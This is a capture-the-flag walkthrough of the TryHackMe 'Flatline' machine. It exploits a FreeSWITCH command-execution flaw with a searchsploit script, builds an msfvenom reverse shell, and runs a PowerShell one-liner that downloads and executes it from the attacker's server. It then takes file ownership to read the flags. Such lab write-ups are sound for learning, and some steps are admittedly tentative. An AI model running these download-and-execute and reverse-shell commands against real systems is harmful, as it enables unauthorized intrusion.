# Flatline Walkthrough
## Description

What are the flags?

  

This machine may be slower than normal to boot up and carry out operations.  

What is the user.txt flag?  


What is the root.txt flag?

## Enumeration

Make sure to connect to THM by either connecting using the VPN or clicking on the "Start Attackbox" button.
Create a directory where we will start our enumeration process:
```bash
mkdir thm/flatline
```
Get the IP for the machine when starting it and store it in the variable `IP`:
```bash
export IP=<IP-ADDRESS>
```

Since this is a windows box with host discovery disabled, we will do the following:
```bash
nmap -sC -sV -vv -Pn $IP
```
![[Pasted image 20220301114043.png]]
There is only one port that we can research to find a vulnerability and that is port 8021:
![[Pasted image 20220301114150.png]]
Search either on Google or `searchsploit` for "freeswitch"
```bash
searchsploit freeswitch
```
This gives us two options, of which we will use the second one:
![[Pasted image 20220301114503.png]]
Now using `searchsploit` we can copy the `windows/remote/47799.txt` into our directory used to enumerate the box (for instance in `thm/flatline`.

```bash
searchsploit -m /windows/remote/47799.txt
```
Now rename the file to `exploit.py` and change mode to execute:
```bash
mv 47799.txt exploit.py && chmod +x exploit.py
```
To use the exploit, you'll need to provide it with the IP of the target and also the command to run on Windows. For example:
```bash
python3 exploit.py $IP whoami
```
Which will output:
![[Pasted image 20220301115733.png]]

We will now create a reverse tcp shell to connect to the target. Run`ip a` and copy the `tun0` IP address (after `inet`) when connected to the TryHackMe VPN. Replace "ATTACK-IP" with what you copied.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK-IP> LPORT=4444 -f exe > shell.exe
```
![[Pasted image 20220301121738.png]]

We'll also need an `http` server running to upload our `.exe` file to the target so do this in a separate terminal tab:
```bash
python3 -m http.server
```

Now we can start our listener in another terminal tab.
```bash
nc -lvnp 4444
```

Last but not least, run the exploit with the appropriate set up. Make sure to change the IP to your own attacker IP address. 
```bash
python3 exploit.py 10.10.42.179 "powershell.exe Invoke-WebRequest -Uri http://10.2.104.41:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
```
![[Pasted image 20220301122611.png]]
Go back to the listener and you should see that you're connected to the target.

#TODO

Browse to `Nekrotic`'s Desktop and list out it's contents:
![[Pasted image 20220301120339.png]]

We see both flags but will need to escalate privileges to view the `root.txt` flag. 

To get the `user.txt` flag do:
```bash
type user.txt
```
and to get the root flag do:
```
takeown /R /F *.*
```

![[Pasted image 20220301120639.png]]
#TODO
I'm not certain if we need to do this next step but it's worth a shot:
```bash
icacls "root".txt /q /c /t /grant Users:F
```
![[Pasted image 20220301120849.png]]

Now switch over to `powershell` so we can `cat` out our root flag.
```bash
powershell
```

NOTE: both `cat` in `powershell` and `type` in `cmd` will output the root flag:
![[Pasted image 20220301121141.png]]

Done. You have successfully completed this challenge.